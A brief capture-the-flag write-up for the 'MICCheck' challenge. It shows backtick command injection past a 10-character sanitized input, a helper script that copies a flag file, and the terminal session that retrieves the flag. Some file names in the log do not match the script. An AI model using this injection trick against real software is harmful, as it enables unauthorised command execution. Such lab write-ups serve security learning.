# MICCheck (1 point)

# Solution

Although input (limited to 10 characters) is sanitized, we can still inject commands into it through the backtick (\`), and include arguments by delimiting them with tabs (spaces are disallowed). I wrote a quick script to open the flag file and put its contents into another file.

```
#!/bin/bash

cat /home/mic/mic.flag.txt > /tmp/theflagisherefriends
```

Giving the script executable permissions and ensuring the file size was one character long (to meet the 10 character limit), we run <pre>miccheck</pre>.

```
mic@ubuntu:~$ ./miccheck
input path :    `/tmp/z`
mic@ubuntu:~$ cat /tmp/theflagmfeng
let the hacking begins
```

The flag is <pre>let the hacking begins</pre>.
